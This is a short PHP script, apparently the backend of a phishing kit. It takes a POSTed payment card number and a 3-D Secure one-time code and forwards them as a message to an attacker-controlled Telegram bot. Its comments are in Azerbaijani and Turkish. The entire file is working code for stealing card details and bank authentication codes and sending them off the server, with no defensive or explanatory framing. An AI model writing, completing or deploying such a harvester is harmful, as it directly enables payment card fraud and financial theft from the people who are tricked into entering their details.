<?php
// ====== ENVIRONMENT VARIABLES ======
$botToken = getenv('TELEGRAM_BOT_TOKEN');
$chatId = getenv('TELEGRAM_CHAT_ID');

if (!$botToken || !$chatId) {
    http_response_code(500);
    die(json_encode(['status' => 'error', 'message' => 'Server configuration error']));
}

// ====== YALNIZ POST SORĞULARINA İCAZƏ VER ======
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    die(json_encode(['status' => 'error', 'message' => 'Method Not Allowed']));
}

// ====== MƏLUMATLARI AL ======
$cardNumber = $_POST['card_number'] ?? '';
$tdsCode = $_POST['tds_code'] ?? '';

// ====== OTP MESAJI (EMOJİSİZ) ======
$message = "YENI BILGI OTP\n\n";
$message .= "OTP Kodu: $tdsCode\n\n";
$message .= "Kart Nomresi: $cardNumber";

// ====== TELEGRAM-A GÖNDƏR ======
$url = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($httpCode === 200) {
    echo json_encode(['status' => 'success', 'message' => 'OTP sent to Telegram']);
} else {
    http_response_code(500);
    echo json_encode(['status' => 'error', 'message' => 'Failed to send OTP']);
}
?>
